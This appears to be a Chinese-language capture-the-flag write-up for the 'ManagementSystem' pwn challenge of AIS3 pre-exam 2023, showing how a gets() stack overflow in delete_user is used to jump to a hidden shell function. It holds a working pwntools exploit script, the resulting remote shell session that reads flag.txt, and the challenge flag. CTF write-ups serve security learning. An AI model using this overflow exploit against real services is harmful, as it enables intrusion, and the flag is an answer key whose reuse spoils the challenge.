# ManagementSystem
## 題目

![image](https://user-images.githubusercontent.com/57281249/239945264-fe5fdba3-c448-4cb5-a992-c3e0e517a49e.png)

## 解題
1. IDA 打開
2. 人真好有給 shell code
![image](https://user-images.githubusercontent.com/57281249/239945579-c0bb2a2a-acb4-44a1-877d-45215b54d609.png)
3. 每個 user 的 function 找一遍後發現 `delete_user` 有用 gets，可以 stack overflow，先讓他跑到 `"Invalid index."` 感覺問題比較少。
![image](https://user-images.githubusercontent.com/57281249/239946309-5ab98d0b-aa5e-4a18-ae77-4e6f49c20f30.png)
4. 找 shell code 的位置
![image](https://user-images.githubusercontent.com/57281249/239947071-567d01ea-a12f-422b-86ce-5e64132ec7b9.png)
5. exploit
```python
import pwn
import re
import sys

r = pwn.remote('chals1.ais3.org', 10003)

print(r.recvrepeat(timeout=1).decode())
r.sendline(b'3')
print(r.recvrepeat(timeout=1).decode())
r.sendline(b'-1' + b'x'*(8*13-2) + int('40131B', 16).to_bytes(3, 'little'))

while True:
    print(r.recvrepeat(timeout=1).decode(), end='')
    print('> ', end='')
    r.send(input().encode())
#    r.send(sys.stdin.buffer.read())
```

```
chummy@hitcon:~/ais3preexam2023$ python3 mansysexp.py                                                                                                                                                    [11/294][+] Opening connection to chals1.ais3.org on port 10003: Done
Choose an option:
1. Add user
2. Show users
3. Delete user
4. Exit
>
Enter the index of the user you want to delete:
Invalid index.
Congratulations! You've successfully executed the secret function.
> ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
> ls /home/chal
Makefile
flag.txt
ms
ms.c
run.sh
> cat /home/chal/flag.txt
FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}
> exit
>
>
[*] Closed connection to chals1.ais3.org port 10003
Traceback (most recent call last):
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py", line 65, in send_raw
    self.sock.sendall(data)
BrokenPipeError: [Errno 32] Broken pipe

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/chummy/ais3preexam2023/mansysexp.py", line 15, in <module>
    r.send(input().encode())
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py", line 778, in send
    self.send_raw(data)
  File "/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py", line 70, in send_raw
    raise EOFError
EOFError
```

## Flag
`FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}`